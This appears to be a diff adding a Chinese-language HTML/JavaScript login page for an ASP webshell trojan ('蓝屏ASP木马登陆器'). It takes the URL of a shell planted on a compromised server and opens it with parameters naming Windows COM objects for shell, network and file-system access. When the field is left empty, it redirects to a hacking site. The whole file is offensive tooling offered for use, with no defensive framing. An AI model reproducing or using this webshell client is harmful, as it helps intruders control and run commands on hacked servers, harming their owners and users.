@@ -1,0 +1,34 @@
+<META http-equiv=Content-Type content="text/html; charset=gb2312">
+<style>body{font-size:9pt;color:blue}table{font-family:宋体;font-size:9pt}a{font-family:宋体;font-size:9pt;color:blue;text-decoration:none}a:hover{font-family:宋体;color:red}input{BORDER-RIGHT:blue 1px solid;BORDER-TOP:blue 1px solid;BACKGROUND:white;BORDER-LEFT:blue 1px solid;BORDER-BOTTOM:blue 1px solid;FONT-FAMILY:Verdana,Arial FONT-COLOR:blue;FONT-SIZE:9pt;}</style>
+<body onLoad=init() bgcolor=#61bbd6>
+<script language=JavaScript>
+var ticker,sec,min,id;
+function init(){clearTimeout(id);ticker=0;min=0;sec=0;}
+function runclk(){
+min=Math.floor(ticker/60);
+sec=(ticker-(min*60))+'';
+if(sec.length==1){sec="0"+sec};
+ticker++;
+document.forms[1].view.value=min+":"+sec;
+id=setTimeout('init()',9000);
+id=setTimeout('runclk()',1000);
+}
+function lp()
+{
+runclk();document.forms[1].view.value="加载中...";
+setTimeout("document.forms[1].view.value='登陆中...'",9000);
+if(document.forms[0].ma.value<=0){window.location.href="http://www.icehack.com";return false;}
+location.href="http://"+document.forms[0].ma.value+"?lP=Adodb.Stream&tN=WSCRIPT.NETWORK&sa=shell.application&TV=WSCRIPT.shell&fB=Scripting.FileSystemObject&SY=Scripting.Dictionary&az=lp&aw=2005&rz=2005&rz1=2005";
+return false;
+}
+</script>
+<center><font color=220066 style='font-size:18pt;font-family: 宋体'><B>蓝屏ASP木马登陆器</B></font>
+<FORM>http://<input type="text" name="ma" size=60></FORM>
+<FORM><INPUT type="button" name=view value="登陆" onClick=lp()></FORM>
+<input type="button" value="关闭(ATL+X)" onClick="JavaScript:self.close()">
+<input type="reset" value="重置" onClick="javascript:window.location.reload()" target="_self">
+<div id='dh' style="position:absolute; left:-800px; top:-800px; width:0px; height:0px; z-index:1">
+<input type=button value='-' name='close' onClick='Javascript:window.close();' accesskey='X'>
+</div><br>
+<FONT style='FONT-SIZE:48pt;FONT-FAMILY:Wingdings'>&lt;:8</FONT>
+</body>
